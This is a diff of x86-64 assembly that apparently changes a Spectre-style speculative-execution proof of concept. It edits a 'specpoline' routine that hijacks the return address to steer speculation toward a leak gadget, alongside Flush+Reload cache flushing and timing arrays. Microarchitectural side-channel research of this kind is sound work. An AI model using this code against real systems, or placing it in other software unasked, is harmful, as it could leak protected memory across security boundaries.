@@ -18,7 +18,6 @@ SECTION .data
 
     ;Timings array
     timings         TIMES 256           dd 0
-
  
 SECTION .code
 
@@ -27,19 +26,17 @@ SECTION .code
     ;/ \/ \/ \                                                         / \/ \/ \
     
     specpoline:
-        ;Long dependancy chain
-        fld1
-        TIMES 4 f2xm1
-        fcos
-        TIMES 4 f2xm1
-        fcos
-        TIMES 4 f2xm1
+        lea rax, [leak.profile]
+
+        xorps xmm0, xmm0
+        TIMES 10 sqrtpd xmm0, xmm0
 
         %ifdef ARCH_STORE
             mov DWORD [buffer], 241     ;Store in the first line
         %endif
 
-        add rsp, 8
+        ;add rsp, 8
+        mov QWORD [rsp], rax
         ret
 
  
@@ -109,12 +106,14 @@ SECTION .code
         push rdx
         push rsi
 
+        
+
         ;Flush the F+R lines
         call flush
 
         ;Unaligned stack, don't mind
-        lea rax, [.profile]
-        push rax
+        ;;lea rax, [.profile]
+        ;;push rax
         call specpoline
 
         ;O.O 0
